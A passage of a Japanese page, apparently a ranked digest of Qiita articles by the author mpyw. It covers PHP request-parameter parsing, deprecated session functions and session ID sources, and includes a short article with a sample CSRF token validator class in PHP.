<span id="csrf攻撃って何どうやって対策するの" class="fragment"></span><a href="#csrf%E6%94%BB%E6%92%83%E3%81%A3%E3%81%A6%E4%BD%95%E3%81%A9%E3%81%86%E3%82%84%E3%81%A3%E3%81%A6%E5%AF%BE%E7%AD%96%E3%81%99%E3%82%8B%E3%81%AE"><i class="fa fa-link"></i></a>「CSRF攻撃」って何？どうやって対策するの？</h2>

<p>以下の記事の4章で具体例を交えて説明しています．</p>

<ul>
<li><a href="http://qiita.com/mpyw/items/2c54d0ea95423bd88f60" id="reference-ae44cdb5bdfcfe86d04b">Qiita - 【PHP初心者向け】セキュアな掲示板を最小構成から作る</a></li>
</ul>

<p>リンク先の記事の中で</p>

<blockquote>
<p>原理や対策方法について詳しく説明すると難解になってくるので，ここでは対策方法だけを簡単にまとめておきます．興味のある方は各自調べてみてください．</p>
</blockquote>

<p>と述べていますが，本記事を最後まで読まれた方なら自然と理解が進むと思います．対策の内容をまとめると，<strong>「ページを表示している本人しか知らないセッションIDを元にした値を埋め込んでおくことで，本人の意図通りにフォームが送信されたかどうかわかる」</strong>というところです． (但し，XSSなど別の脆弱性がある場合にはCSRF対策は機能しない)</p>

<hr>

<hr>

<h1>
<span id="付録" class="fragment"></span><a href="#%E4%BB%98%E9%8C%B2"><i class="fa fa-link"></i></a>付録</h1>

<h2>
<span id="リクエストパラメータのパース規則" class="fragment"></span><a href="#%E3%83%AA%E3%82%AF%E3%82%A8%E3%82%B9%E3%83%88%E3%83%91%E3%83%A9%E3%83%A1%E3%83%BC%E3%82%BF%E3%81%AE%E3%83%91%E3%83%BC%E3%82%B9%E8%A6%8F%E5%89%87"><i class="fa fa-link"></i></a>リクエストパラメータのパース規則</h2>

<h3>
<span id="_get-_post-_cookie" class="fragment"></span><a href="#_get-_post-_cookie"><i class="fa fa-link"></i></a><code>$_GET</code> <code>$_POST</code> <code>$_COOKIE</code>
</h3>

<ul>
<li>1つの要素は <strong><code>キー=値</code></strong> という構造を取る．</li>
<li>同じキーが複数回現れた場合，後に出現したものが優先される．</li>
<li>
<strong><code>キー</code></strong> または <strong><code>キー=</code></strong> とした場合，値は <strong>空文字列</strong> であると見なされる．</li>
<li>キーに存在する <strong><code>.</code></strong> は <strong><code>_</code></strong> に置換される．</li>
<li>キーが <strong>空文字列</strong> であるものは無視される．</li>
<li>
<a href="http://ja.wikipedia.org/wiki/%E3%83%91%E3%83%BC%E3%82%BB%E3%83%B3%E3%83%88%E3%82%A8%E3%83%B3%E3%82%B3%E3%83%BC%E3%83%87%E3%82%A3%E3%83%B3%E3%82%B0" rel="nofollow noopener" target="_blank">パーセントエンコーディング</a> に関して，デコード可能な部分はデコードし，不可能な部分はそのまま受け取る．つまり<ins>可能な限りデコードしようとする</ins>．キーと値どちらに対しても同様．</li>
<li>
<strong><code>+</code></strong> はパーセントエンコーディングの <code>%20</code> と同様に <strong>半角スペース</strong> に置換される．</li>
<li>データ型は <strong>文字列</strong> と <strong>配列</strong> の2通りしかない．</li>
<li>
<strong><code>[]</code></strong> をキーに添えることで <strong>配列</strong> が表現できるが，開きカッコと閉じカッコの数が合わない場合，以下の処理のどれかが適用される．バージョンによって挙動が異なる可能性があり，個人的には未定義として扱ったほうがいいように思うので詳細は割愛する．

<ul>
<li>外側を優先してペアとしてパースし，残った内側の <strong><code>[</code></strong> を伴う部分は通常の文字列として扱う．</li>
<li>無視される．</li>
<li>
<strong><code>_</code></strong> に置換される．</li>
</ul>
</li>
</ul>

<h3>
<span id="_get" class="fragment"></span><a href="#_get"><i class="fa fa-link"></i></a><code>$_GET</code>
</h3>

<ul>
<li>区切り文字には <strong><code>&amp;</code></strong> が使われる．</li>
<li>パーセントエンコードされていない <strong>半角スペース</strong> と <strong>改行</strong> と <strong>NULLバイト</strong> の混入は一切認められない．</li>
<li>他にも使用不可能な文字がいくつかあるが紹介は割愛する．基本的にパーセントエンコードが必須だと思ったほうがいい．</li>
</ul>

<div class="code-frame" data-lang="text">
<div class="code-lang"><span class="bold">デコード前 (見やすいように改行を入れています)</span></div>
<div class="highlight"><pre><span></span>raw_text=あ&amp;
encoded_text=%E3%81%82&amp;
raw_percent=%&amp;
encoded_percent=%25&amp;
raw_equals===&amp;
encoded_equals=%3D%3D&amp;
raw_array[]=value&amp;
encoded_array%5B%5D=value&amp;
assoc[key]=value
</pre></div>
</div>

<div class="code-frame" data-lang="php">
<div class="code-lang"><span class="bold">デコード後 (代入のイメージ)</span></div>
<div class="highlight"><pre><span></span><span class="nv">$_GET</span> <span class="o">=</span> <span class="p">[</span>
    <span class="s1">'raw_text'</span> <span class="o">=&gt;</span> <span class="s1">'あ'</span><span class="p">,</span>
    <span class="s1">'encoded_text'</span> <span class="o">=&gt;</span> <span class="s1">'あ'</span><span class="p">,</span>
    <span class="s1">'raw_percent'</span> <span class="o">=&gt;</span> <span class="s1">'%'</span><span class="p">,</span>
    <span class="s1">'encoded_percent'</span> <span class="o">=&gt;</span> <span class="s1">'%'</span><span class="p">,</span>
    <span class="s1">'raw_equals'</span> <span class="o">=&gt;</span> <span class="s1">'=='</span><span class="p">,</span>
    <span class="s1">'encoded_equals'</span> <span class="o">=&gt;</span> <span class="s1">'=='</span><span class="p">,</span>
    <span class="s1">'raw_array'</span> <span class="o">=&gt;</span> <span class="p">[</span>
        <span class="mi">0</span> <span class="o">=&gt;</span> <span class="s1">'value'</span><span class="p">,</span>
    <span class="p">],</span>
    <span class="s1">'encoded_array'</span> <span class="o">=&gt;</span> <span class="p">[</span>
        <span class="mi">0</span> <span class="o">=&gt;</span> <span class="s1">'value'</span><span class="p">,</span>
    <span class="p">],</span>
    <span class="s1">'assoc'</span> <span class="o">=&gt;</span> <span class="p">[</span>
        <span class="s1">'key'</span> <span class="o">=&gt;</span> <span class="s1">'value'</span><span class="p">,</span>
    <span class="p">],</span>
<span class="p">];</span>
</pre></div>
</div>

<h3>
<span id="_post" class="fragment"></span><a href="#_post"><i class="fa fa-link"></i></a><code>$_POST</code>
</h3>

<ul>
<li>区切り文字には <strong><code>&amp;</code></strong> が使われる．</li>
<li>パーセントエンコードされていない <strong>半角スペース</strong> と <strong>改行</strong> と <strong>NULLバイト</strong> の混入は<ins>認められる</ins>．但し…

<ul>
<li>キーに存在する <strong>半角スペース</strong> のみ <strong><code>_</code></strong> に置換される．</li>
<li>キーに存在する <strong>NULLバイト</strong> のみ終端文字として扱われる <strong>（<ins>手前で切り捨てられる</ins>）</strong> ．</li>
</ul>
</li>
</ul>

<div class="code-frame" data-lang="text">
<div class="code-lang"><span class="bold">デコード前 (改行は実際に入れます)</span></div>
<div class="highlight"><pre><span></span>A = B &amp;
C
= D
&amp;E
 = F
</pre></div>
</div>

<div class="code-frame" data-lang="php">
<div class="code-lang"><span class="bold">デコード後 (代入のイメージ)</span></div>
<div class="highlight"><pre><span></span><span class="nv">$_POST</span> <span class="o">=</span> <span class="p">[</span>
    <span class="s2">"A_"</span> <span class="o">=&gt;</span> <span class="s2">" B "</span><span class="p">,</span>
    <span class="s2">"</span><span class="se">\n</span><span class="s2">C</span><span class="se">\n</span><span class="s2">"</span> <span class="o">=&gt;</span> <span class="s2">" D</span><span class="se">\n</span><span class="s2">"</span><span class="p">,</span>
    <span class="s2">"E</span><span class="se">\n</span><span class="s2">_"</span> <span class="o">=&gt;</span> <span class="s2">" F"</span><span class="p">,</span>
<span class="p">];</span>
</pre></div>
</div>

<h3>
<span id="_cookie" class="fragment"></span><a href="#_cookie"><i class="fa fa-link"></i></a><code>$_COOKIE</code>
</h3>

<ul>
<li>区切り文字には <strong><code>;</code></strong> が使われる．</li>
<li>Studying HTTP に以下のような記述があったが，手元の <em>Apache/2.4.4 (Win32) OpenSSL/0.9.8y PHP/5.4.16</em> で試したみたところ非対応のようであった．</li>
</ul>

<blockquote>
<p><strong>RFC 2109</strong> のクッキーでは， <strong><code>;</code></strong> の他に <strong><code>,</code></strong> も使用できるようになりました．サーバは将来の互換性のために区切り子として <strong><code>,</code></strong> も受け入れるべきです．</p>
</blockquote>

<ul>
<li>パーセントエンコードされていない <strong>半角スペース</strong> の混入は<ins>認められる</ins>．但し…

<ul>
<li>
<strong>「<code>Cookie:</code>または<code>;</code>」</strong> ～ <strong>「半角スペース以外の文字」</strong> の間の半角スペースは無視される．</li>
<li>
<strong>「半角スペース以外の文字」</strong> ～ <strong><code>=</code></strong> の間の半角スペースは <strong><code>_</code></strong> に置換される．</li>
</ul>
</li>
<li>パーセントエンコードされていない <strong>改行</strong> と <strong>NULLバイト</strong> の混入は一切認められない．</li>
</ul>

<div class="code-frame" data-lang="text">
<div class="code-lang"><span class="bold">デコード前</span></div>
<div class="highlight"><pre><span></span>Cookie: A = B ; C = D ; . = . ; E ; F
</pre></div>
</div>

<div class="code-frame" data-lang="php">
<div class="code-lang"><span class="bold">デコード後 (代入のイメージ)</span></div>
<div class="highlight"><pre><span></span><span class="nv">$_COOKIE</span> <span class="o">=</span> <span class="p">[</span>
    <span class="s1">'A_'</span> <span class="o">=&gt;</span> <span class="s1">' B '</span><span class="p">,</span>
    <span class="s1">'C_'</span> <span class="o">=&gt;</span> <span class="s1">' D '</span><span class="p">,</span>
    <span class="s1">'__'</span> <span class="o">=&gt;</span> <span class="s1">' . '</span><span class="p">,</span>
    <span class="s1">'E_'</span> <span class="o">=&gt;</span> <span class="s1">''</span><span class="p">,</span>
    <span class="s1">'F'</span> <span class="o">=&gt;</span> <span class="s1">''</span><span class="p">,</span>
<span class="p">];</span>
</pre></div>
</div>

<h2>
<span id="使ってはいけないセッション関数" class="fragment"></span><a href="#%E4%BD%BF%E3%81%A3%E3%81%A6%E3%81%AF%E3%81%84%E3%81%91%E3%81%AA%E3%81%84%E3%82%BB%E3%83%83%E3%82%B7%E3%83%A7%E3%83%B3%E9%96%A2%E6%95%B0"><i class="fa fa-link"></i></a>使ってはいけないセッション関数！？</h2>

<h3>
<span id="session_register-関数" class="fragment"></span><a href="#session_register-%E9%96%A2%E6%95%B0"><i class="fa fa-link"></i></a><a href="http://www.php.net/manual/ja/function.session-register.php" rel="nofollow noopener" target="_blank">session_register</a> 関数</h3>

<p>PHPの歴史のお話をします．実は太古のPHP4.0まではスーパーグローバル変数が実装されておらず，以下のような変数を使う必要がありました．これらはただグローバルスコープに存在している変数であり，任意のスコープからアクセスすることができる変数ではありませんでした．</p>

<div class="code-frame" data-lang="php"><div class="highlight"><pre><span></span><span class="nv">$HTTP_GET_VARS</span>
<span class="nv">$HTTP_POST_VARS</span>
<span class="nv">$HTTP_COOKIE_VARS</span>
<span class="nv">$HTTP_SESSION_VARS</span>
</pre></div></div>

<p>これらはスーパーグローバルでない上に変数名が非常に長く，かなり使い勝手が悪いです．そこで，PHP5.3まではリクエストされた配列をローカル変数として自動展開する，つまり</p>

<div class="code-frame" data-lang="php"><div class="highlight"><pre><span></span><span class="nb">extract</span><span class="p">(</span><span class="nv">$HTTP_COOKIE_VARS</span><span class="p">,</span> <span class="nx">EXTR_SKIP</span><span class="p">);</span>
<span class="nb">extract</span><span class="p">(</span><span class="nv">$HTTP_POST_VARS</span><span class="p">,</span> <span class="nx">EXTR_SKIP</span><span class="p">);</span>
<span class="nb">extract</span><span class="p">(</span><span class="nv">$HTTP_GET_VARS</span><span class="p">,</span> <span class="nx">EXTR_SKIP</span><span class="p">);</span>
</pre></div></div>

<p>に該当する処理をPHPスクリプト実行開始時にグローバルスコープで自動的に行う <a href="http://php.net/manual/ja/security.globals.php" rel="nofollow noopener" target="_blank">register_globals</a> という機能が存在していました．前者3つに関してはリクエストを送る<ins>ユーザー側が展開する変数を決定する</ins>ことになっていました．これは非常に危険な機能であるとの批判が集中したため，PHP5.4で削除されています．</p>

<p>セッションに関しては <a href="http://www.php.net/manual/ja/function.session-register.php" rel="nofollow noopener" target="_blank">session_register</a> 関数を使って<ins>プログラマ側が手動登録して参照状態にする</ins>仕組みになっていました．つまり，指定したものに関してだけ</p>

<div class="code-frame" data-lang="php"><div class="highlight"><pre><span></span><span class="nb">extract</span><span class="p">(</span><span class="nv">$HTTP_SESSION_VARS</span><span class="p">,</span> <span class="nx">EXTR_OVERWRITE</span> <span class="o">|</span> <span class="nx">EXTR_REFS</span><span class="p">);</span>
</pre></div></div>

<p>が行われるということです．いくらは register_globals よりはマシですが，これも設計上好ましくないという理由で，PHP5.4にて削除されています．したがって，これらの関数は使ってはいけない，というか使うことができません．</p>

<h3>
<span id="session_set_cookie_params-関数" class="fragment"></span><a href="#session_set_cookie_params-%E9%96%A2%E6%95%B0"><i class="fa fa-link"></i></a><a href="http://php.net/manual/ja/function.session-set-cookie-params.php" rel="nofollow noopener" target="_blank">session_set_cookie_params</a> 関数</h3>

<p>この関数はセッション用Cookieの挙動を制御する関数ですが，たとえば<ins>第3引数の値を設定するためには第1引数と第2引数も渡さなければならない</ins>という致命的な欠陥があり，非常に使い勝手が悪いです．</p>

<div class="code-frame" data-lang="php">
<div class="code-lang"><span class="bold">httponlyを有効にする (session_set_cookie_paramsを使う場合)</span></div>
<div class="highlight"><pre><span></span><span class="c1">// 冗長</span>
<span class="nv">$p</span> <span class="o">=</span> <span class="nb">session_get_cookie_params</span><span class="p">();</span>
<span class="nb">session_set_cookie_params</span><span class="p">(</span><span class="nv">$p</span><span class="p">[</span><span class="s1">'lifetime'</span><span class="p">],</span> <span class="nv">$p</span><span class="p">[</span><span class="s1">'path'</span><span class="p">],</span> <span class="nv">$p</span><span class="p">[</span><span class="s1">'domain'</span><span class="p">],</span> <span class="nv">$p</span><span class="p">[</span><span class="s1">'secure'</span><span class="p">],</span> <span class="k">true</span><span class="p">);</span>

<span class="c1">// 多少はマシ</span>
<span class="nv">$p</span> <span class="o">=</span> <span class="nb">session_get_cookie_params</span><span class="p">();</span>
<span class="nv">$p</span><span class="p">[</span><span class="s1">'httponly'</span><span class="p">]</span> <span class="o">=</span> <span class="k">true</span><span class="p">;</span>
<span class="nb">call_user_func_array</span><span class="p">(</span><span class="s1">'session_set_cookie_params'</span><span class="p">,</span> <span class="nv">$p</span><span class="p">);</span>

<span class="c1">// PHP5.6以降，array_valuesがいるのがつらい</span>
<span class="nv">$p</span> <span class="o">=</span> <span class="nb">session_get_cookie_params</span><span class="p">();</span>
<span class="nv">$p</span><span class="p">[</span><span class="s1">'httponly'</span><span class="p">]</span> <span class="o">=</span> <span class="k">true</span><span class="p">;</span>
<span class="nb">session_set_cookie_params</span><span class="p">(</span><span class="o">...</span><span class="nb">array_values</span><span class="p">(</span><span class="nv">$p</span><span class="p">));</span>
</pre></div>
</div>

<p>記事中で紹介しているとおり， <a href="http://php.net/manual/ja/function.ini-set.php" rel="nofollow noopener" target="_blank">ini_set</a> などを用いる方法で十分です．</p>

<div class="code-frame" data-lang="php">
<div class="code-lang"><span class="bold">httponlyを有効にする (ini_setを使う場合)</span></div>
<div class="highlight"><pre><span></span><span class="nb">ini_set</span><span class="p">(</span><span class="s1">'session.cookie_httponly'</span><span class="p">,</span> <span class="k">true</span><span class="p">);</span>
</pre></div>
</div>

<h3>
<span id="session_unset-関数" class="fragment"></span><a href="#session_unset-%E9%96%A2%E6%95%B0"><i class="fa fa-link"></i></a><a href="http://www.php.net/manual/ja/function.session-unset.php" rel="nofollow noopener" target="_blank">session_unset</a> 関数</h3>

<p>次の2つの操作は等価ですが，後者の方を利用するようにかつてマニュアルが推奨していました．</p>

<div class="code-frame" data-lang="php"><div class="highlight"><pre><span></span><span class="nb">session_unset</span><span class="p">();</span>
</pre></div></div>

<div class="code-frame" data-lang="php"><div class="highlight"><pre><span></span><span class="nv">$_SESSION</span> <span class="o">=</span> <span class="p">[];</span>
</pre></div></div>

<p>今は方針が変わっているみたいですが，敢えて関数を利用する必要はないかと思います．</p>

<h2>
<span id="セッションの個人識別用パラメータ完全版-優先度順" class="fragment"></span><a href="#%E3%82%BB%E3%83%83%E3%82%B7%E3%83%A7%E3%83%B3%E3%81%AE%E5%80%8B%E4%BA%BA%E8%AD%98%E5%88%A5%E7%94%A8%E3%83%91%E3%83%A9%E3%83%A1%E3%83%BC%E3%82%BF%E5%AE%8C%E5%85%A8%E7%89%88-%E5%84%AA%E5%85%88%E5%BA%A6%E9%A0%86"><i class="fa fa-link"></i></a>セッションの個人識別用パラメータ完全版 (優先度順)</h2>

<h3>
<span id="1-_cookie-1" class="fragment"></span><a href="#1-_cookie-1"><i class="fa fa-link"></i></a>1. <code>$_COOKIE</code>
</h3>

<ul>
<li>
<a href="http://www.php.net/manual/ja/session.configuration.php#ini.session.use-cookies" rel="nofollow noopener" target="_blank">session.use_cookies</a> が有効な場合のみ採用されます．デフォルトは有効です．</li>
<li>ユーザー側に <strong>Set-Cookieヘッダー</strong> が自動的に送信されるようになります．</li>
</ul>

<h3>
<span id="2-_get-1" class="fragment"></span><a href="#2-_get-1"><i class="fa fa-link"></i></a>2. <code>$_GET</code>
</h3>

<ul>
<li>
<a href="http://www.php.net/manual/ja/session.configuration.php#ini.session.use-only-cookies" rel="nofollow noopener" target="_blank">session.use_only_cookies</a> が無効な場合のみ採用されます．デフォルトは<ins>PHP5.2以前では無効</ins>，PHP5.3以降では有効です．</li>
<li>
<p>以下の条件を全て満たしたとき，HTML中に存在するURLに対してクエリが自動で付加されます．</p>

<ul>
<li>
<a href="http://www.php.net/manual/ja/session.configuration.php#ini.session.use-trans-sid" rel="nofollow noopener" target="_blank">session.use_trans_sid</a> が有効である．</li>
<li>出力バッファリングを行っていなければならない．つまり <a href="http://www.php.net/manual/ja/function.ob-get-level.php" rel="nofollow noopener" target="_blank">ob_get_level</a> 関数の返り値が1以上でなければならない． <a href="http://www.php.net/manual/ja/outcontrol.configuration.php#ini.output-buffering" rel="nofollow noopener" target="_blank">output_buffering</a> が無効な場合は最初に <a href="http://www.php.net/manual/ja/function.ob-start.php" rel="nofollow noopener" target="_blank">ob_start</a> 関数をコールしておく必要がある．</li>
<li>相対URL(絶対パス・相対パス)でなければならない．外部サイトに送信してしまうリスクがあるため，<ins>絶対URLには付加されない</ins>．</li>
</ul>
</li>
<li><p>手動で付加する場合には，定数 <strong><code>SID</code></strong> を使用します．<code>'PHPSESSID=xxxxx'</code> のような値が自動的に設定されています．</p></li>
</ul>

<div class="code-frame" data-lang="html+php">
<div class="code-lang"><span class="bold">絶対URLに手動で付加する例</span></div>
<div class="highlight"><pre><span></span><span class="p">&lt;</span><span class="nt">a</span> <span class="na">href</span><span class="o">=</span><span class="s">"http://example.com/test.php?</span><span class="cp">&lt;?</span><span class="o">=</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nx">SID</span><span class="p">,</span> <span class="nx">ENT_QUOTES</span><span class="p">,</span> <span class="s1">'UTF-8'</span><span class="p">)</span><span class="cp">?&gt;</span><span class="s">"</span><span class="p">&gt;</span>Test<span class="p">&lt;/</span><span class="nt">a</span><span class="p">&gt;</span>
</pre></div>
</div>

<h3>
<span id="3-_post" class="fragment"></span><a href="#3-_post"><i class="fa fa-link"></i></a>3. <code>$_POST</code>
</h3>

<ul>
<li>
<a href="http://www.php.net/manual/ja/session.configuration.php#ini.session.use-only-cookies" rel="nofollow noopener" target="_blank">session.use_only_cookies</a> が無効な場合のみ採用されます．デフォルトは<ins>PHP5.2以前では無効</ins>，PHP5.3以降では有効です．</li>
<li>送信は全て手動で行う必要があります．</li>
</ul>

<h3>
<span id="4-_serverrequest_uri" class="fragment"></span><a href="#4-_serverrequest_uri"><i class="fa fa-link"></i></a>4. <code>$_SERVER['REQUEST_URI']</code>
</h3>

<p><code>http://example.com/PHPSESSID=xxxxx/test.php</code> のように自由な形で埋め込むことを許可します．</p>

<ul>
<li>
<a href="http://www.php.net/manual/ja/session.configuration.php#ini.session.use-only-cookies" rel="nofollow noopener" target="_blank">session.use_only_cookies</a> が無効な場合のみ採用されます．デフォルトは<ins>PHP5.2以前では無効</ins>，PHP5.3以降では有効です．</li>
<li>送信は全て手動で行う必要があります．</li>
</ul>

<h3>
<span id="5-_serverhttp_referer" class="fragment"></span><a href="#5-_serverhttp_referer"><i class="fa fa-link"></i></a>5. <code>$_SERVER['HTTP_REFERER']</code>
</h3>

<p>リファラーに対しても2と4に関するチェックが行われます．</p>

<ul>
<li>
<a href="http://www.php.net/manual/ja/session.configuration.php#ini.session.use-only-cookies" rel="nofollow noopener" target="_blank">session.use_only_cookies</a> が無効な場合のみ採用されます．デフォルトは<ins>PHP5.2以前では無効</ins>，PHP5.3以降では有効です．</li>
<li>
<a href="http://www.php.net/manual/ja/session.configuration.php#ini.session.referer-check" rel="nofollow noopener" target="_blank">session.referer_check</a> にURLに含まれるべき自サイト特有の文字列を指定します．こうすることで外部サイトのリファラーと区別することが出来ます．デフォルトは空文字列であり，このディレクティブは事実上無効となっています．<ins>このディレクティブにはほとんどセキュリティ対策の意味はありません</ins>．</li>
</ul>
</div>
	</td>
</tr>
</table>
<br />
<table border="1">
<tr>
	<td rowspan="3"><center>mpywさんの<br />5位</center></td>
	<td colspan="3">
		<kbd><i><img alt="いいね" width="16" height="16" src="../thumb-up-120px.png" /></i>268</kbd>
		<a target="_blank" href="https://qiita.com/mpyw/items/8f8989f8575159ce95fc">とっても簡単なCSRF対策</a>
	</td>
</tr>
<tr>
	<td style="width:100px;"><center>投稿日時</center></td>
	<td style="width:200px;"><center>投稿者</center></td>
	<td style="width:150px;"><center>タグ</center></td>
	<td style="width:350px;"><center>本文</center></td>
</tr>
<tr>
	<td style="width:100px;">
		<!--投稿日時--><center>2013-07-20 06:39:21</center>
	</td>
	<td style="width:200px;">
		@mpyw<br />(シナプス株式会社 所属)<br><img width="80" height="80" src="https://qiita-image-store.s3.amazonaws.com/0/25060/profile-images/1473684251">
	</td>
	<td style="width:150px;">
		<!--タグ-->
		<center><b>[PHP]</b> <b>[セキュリティ]</b> <b>[csrf]</b> </center>
	</td>
	<td style="width:350px;">
		<!--本文-->
		<div style="width:350px;height:150px;overflow-x:hidden;overflow-y:scroll;">
<h1>
<span id="コメント欄の議論に関するまとめ" class="fragment"></span><a href="#%E3%82%B3%E3%83%A1%E3%83%B3%E3%83%88%E6%AC%84%E3%81%AE%E8%AD%B0%E8%AB%96%E3%81%AB%E9%96%A2%E3%81%99%E3%82%8B%E3%81%BE%E3%81%A8%E3%82%81"><i class="fa fa-link"></i></a>コメント欄の議論に関するまとめ</h1>

<p>以下，<strong>XSS脆弱性が存在しない</strong>前提．この脆弱性があるとあらゆるCSRF対策がほとんど意味をなさなくなるので，まずここから潰しておくこと．</p>

<h2>
<span id="セッション固定攻撃に対する対策" class="fragment"></span><a href="#%E3%82%BB%E3%83%83%E3%82%B7%E3%83%A7%E3%83%B3%E5%9B%BA%E5%AE%9A%E6%94%BB%E6%92%83%E3%81%AB%E5%AF%BE%E3%81%99%E3%82%8B%E5%AF%BE%E7%AD%96"><i class="fa fa-link"></i></a>セッション固定攻撃に対する対策</h2>

<ul>
<li>ログイン後に<code>session_regenerate_id</code>を必ず実行する．</li>
<li>ログアウト後に<code>session_destroy</code>を必ず実行する．</li>
</ul>

<h2>
<span id="csrf攻撃に対する対策" class="fragment"></span><a href="#csrf%E6%94%BB%E6%92%83%E3%81%AB%E5%AF%BE%E3%81%99%E3%82%8B%E5%AF%BE%E7%AD%96"><i class="fa fa-link"></i></a>CSRF攻撃に対する対策</h2>

<ul>
<li>セッションIDを抜かれることは原則的には無いが，セッションIDをそのままトークンに用いるのは避けたほうが無難．</li>
<li>ワンタイムトークンにはF5リロードでの誤作動を防止する意味合いもあるが，必ずしもワンタイム性が求められるわけではない．固定トークンでも十分なセキュリティは保証される．</li>
<li>トークンによる対策が施されていない場合，GETであってもPOSTであってもCSRFは実行可能なので，それは議論の対象ではない．</li>
</ul>

<h1>
<span id="実装" class="fragment"></span><a href="#%E5%AE%9F%E8%A3%85"><i class="fa fa-link"></i></a>実装</h1>

<p>以前はワンタイムトークン推奨にしていましたが，意向が変わってきたので固定トークンのサンプルに差し替えておきます．</p>

<div class="code-frame" data-lang="php">
<div class="code-lang"><span class="bold">クラス定義</span></div>
<div class="highlight"><pre><span></span><span class="k">class</span> <span class="nc">CsrfValidator</span> <span class="p">{</span>

    <span class="k">const</span> <span class="no">HASH_ALGO</span> <span class="o">=</span> <span class="s1">'sha256'</span><span class="p">;</span>

    <span class="k">public</span> <span class="k">static</span> <span class="k">function</span> <span class="nf">generate</span><span class="p">()</span>
    <span class="p">{</span>
        <span class="k">if</span> <span class="p">(</span><span class="nb">session_status</span><span class="p">()</span> <span class="o">===</span> <span class="nx">PHP_SESSION_NONE</span><span class="p">)</span> <span class="p">{</span>
            <span class="k">throw</span> <span class="k">new</span> <span class="nx">\BadMethodCallException</span><span class="p">(</span><span class="s1">'Session is not active.'</span><span class="p">);</span>
        <span class="p">}</span>
        <span class="k">return</span> <span class="nb">hash</span><span class="p">(</span><span class="nx">self</span><span class="o">::</span><span class="na">HASH_ALGO</span><span class="p">,</span> <span class="nb">session_id</span><span class="p">());</span>
    <span class="p">}</span>

    <span class="k">public</span> <span class="k">static</span> <span class="k">function</span> <span class="nf">validate</span><span class="p">(</span><span class="nv">$token</span><span class="p">,</span> <span class="nv">$throw</span> <span class="o">=</span> <span class="k">false</span><span class="p">)</span>
    <span class="p">{</span>
        <span class="nv">$success</span> <span class="o">=</span> <span class="nx">self</span><span class="o">::</span><span class="na">generate</span><span class="p">()</span> <span class="o">===</span> <span class="nv">$token</span><span class="p">;</span>
        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$success</span> <span class="o">&amp;&amp;</span> <span class="nv">$throw</span><span class="p">)</span> <span class="p">{</span>
            <span class="k">throw</span> <span class="k">new</span> <span class="nx">\RuntimeException</span><span class="p">(</span><span class="s1">'CSRF validation failed.'</span><span class="p">,</span> <span class="mi">400</span><span class="p">);</span>
        <span class="p">}</span>
        <span class="k">return</span> <span class="nv">$success</span><span class="p">;</span>
    <span class="p">}</span>

<span class="p">}</span>
</pre></div>
</div>

<h1>
<span id="使い方" class="fragment"></span><a href="#%E4%BD%BF%E3%81%84%E6%96%B9"><i class="fa fa-link"></i></a>使い方</h1>

<div class="code-frame" data-lang="html+php">
<div class="code-lang"><span class="bold">フォームに埋め込むとき</span></div>
<div class="highlight"><pre><span></span><span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">"hidden"</span> <span class="na">name</span><span class="o">=</span><span class="s">"token"</span> <span class="na">value</span><span class="o">=</span><span class="s">"</span><span class="cp">&lt;?</span><span class="o">=</span><span class="nx">CsrfValidator</span><span class="o">::</span><span class="na">generate</span><span class="p">()</span><span class="cp">?&gt;</span><span class="s">"</span><span class="p">&gt;</span>
</pre></div>
</div>

<div class="code-frame" data-lang="php">
<div class="code-lang"><span class="bold">検証するとき(返り値チェックタイプ)</span></div>
<div class="highlight"><pre><span></span><span class="cp">&lt;?php</span>

<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">CsrfValidator</span><span class="o">::</span><span class="na">validate</span><span class="p">(</span><span class="nb">filter_input</span><span class="p">(</span><span class="nx">INPUT_POST</span><span class="p">,</span> <span class="s1">'token'</span><span class="p">)))</span> <span class="p">{</span>
    <span class="nb">header</span><span class="p">(</span><span class="s1">'Content-Type: text/plain; charset=UTF-8'</span><span class="p">,</span> <span class="k">true</span><span class="p">,</span> <span class="mi">400</span><span class="p">);</span>
    <span class="k">die</span><span class="p">(</span><span class="s1">'CSRF validation failed.'</span><span class="p">);</span>
<span class="p">}</span>

<span class="c1">// 続きの処理</span>

<span class="cp">?&gt;</span><span class="x"></span>
<span class="x">&lt;!DOCTYPE html&gt;</span>
<span class="x">...</span>
</pre></div>
</div>

<div class="code-frame" data-lang="php">
<div class="code-lang"><span class="bold">検証するとき(例外タイプ)</span></div>
<div class="highlight"><pre><span></span><span class="cp">&lt;?php</span>

<span class="k">try</span> <span class="p">{</span>

    <span class="nx">CsrfValidator</span><span class="o">::</span><span class="na">validate</span><span class="p">(</span><span class="nb">filter_input</span><span class="p">(</span><span class="nx">INPUT_POST</span><span class="p">,</span> <span class="s1">'token'</span><span class="p">),</span> <span class="k">true</span><span class="p">);</span>

    <span class="c1">// 続きの処理…</span>

<span class="p">}</span> <span class="k">catch</span> <span class="p">(</span><span class="nx">\RuntimeException</span> <span class="nv">$e</span><span class="p">)</span> <span class="p">{</span>

    <span class="nb">header</span><span class="p">(</span><span class="s1">'Content-Type: text/plain; charset=UTF-8'</span><span class="p">,</span> <span class="k">true</span><span class="p">,</span> <span class="nv">$e</span><span class="o">-&gt;</span><span class="na">getCode</span><span class="p">()</span> <span class="o">?:</span> <span class="mi">500</span><span class="p">);</span>
    <span class="k">die</span><span class="p">(</span><span class="nv">$e</span><span class="o">-&gt;</span><span class="na">getMessage</span><span class="p">());</span>

<span class="p">}</span>

<span class="cp">?&gt;</span><span class="x"></span>
<span class="x">&lt;!DOCTYPE html&gt;</span>
<span class="x">...</span>
</pre></div>
</div>
</div>
	</td>
</tr>
</table>
<br />
<table border="1">
<tr>
	<td rowspan="3"><center>mpywさんの<br />6位</center></td>
	<td colspan="3">
		<kbd><i><img alt="いいね" width="16" height="16" src="../thumb-up-120px.png" /></i>239</kbd>
		<a target="_blank" href="https://qiita.com/mpyw/items/73ee77a9535cc65eff1e">画像アップロード処理サンプル集</a>
	</td>
</tr>
<tr>
	<td style="width:100px;"><center>投稿日時</center></td>
	<td style="width:200px;"><center>投稿者</center></td>
	<td style="width:150px;"><center>タグ</center></td>
	<td style="width:350px;"><center>本文</center></td>
</tr>
<tr>
	<td style="width:100px;">
		<!--投稿日時--><center>2013-07-17 11:18:59</center>
	</td>
	<td style="width:200px;">
		@mpyw<br />(シナプス株式会社 所属)<br><img width="80" height="80" src="https://qiita-image-store.s3.amazonaws.com/0/25060/profile-images/1473684251">
